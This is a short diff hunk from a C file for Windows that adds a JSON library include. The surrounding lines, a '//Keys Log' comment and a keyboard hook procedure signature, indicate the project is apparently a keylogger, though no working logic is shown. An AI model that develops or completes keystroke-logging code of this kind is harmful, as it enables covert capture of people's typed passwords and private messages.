@@ -1,5 +1,6 @@
 #include <windows.h>
 #include <stdio.h>
+#include "cJSON.h"
 
 //Keys Log
 LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam) {
